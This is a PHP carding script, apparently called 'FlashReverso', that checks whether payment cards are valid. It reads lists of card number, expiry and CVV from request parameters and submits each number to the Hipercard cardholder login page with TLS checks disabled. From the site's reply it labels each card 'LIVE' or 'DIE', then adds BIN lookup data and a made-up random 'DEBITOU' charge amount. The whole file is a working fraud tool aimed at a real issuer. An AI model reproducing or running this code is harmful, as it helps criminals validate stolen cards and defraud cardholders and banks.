<?php
include("consultabin.php");

set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.hipercard.com.br/bi5/Paginas/Cartao/Login.aspx');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'id='.$cc.'&pc=05');
$pagamento = curl_exec($ch);


$pagamento = curl_exec($ch);
if (strpos($pagamento, 'Verifique se você digitou corretamente os números do seu cartão.')) { 
	echo '<span class="label label-danger">DIE → '.$lista.' #FlashReverso<br></span>';

}
 else if (strpos($pagamento, 'Cartão inválido.')){

echo '<span class="label label-danger">DIE → '.$lista.' #FlashReverso<br></span>';

}else{


 $bin = substr($cc, 0,6);
$binn = substr($cc, 0,6);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bincurl = curl_exec($ch);
curl_close($ch);


$json = json_decode($bincurl);
    $cardType = $json->type ? $json->type : "error";

     if($cardType == "error"){ $cardType = "N/A"; }



$data = date("d/m/Y H:i:s");



$valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];




 echo '<span class="label label-success">LIVE →</span> '.$lista.' | PAIS: '.$pais.' | BANCO: '.$banco.' | BANDEIRA: '.$bandeira.' | NIVEL: '.$level.' | TIPO: '.$cardType.' | GATE [HIPERCARD] | <span class="label label-success">DEBITOU: '.$debitouu.'</span> #FlashReverso <br>';
  
  }
 
curl_close($ch);
ob_flush();
?>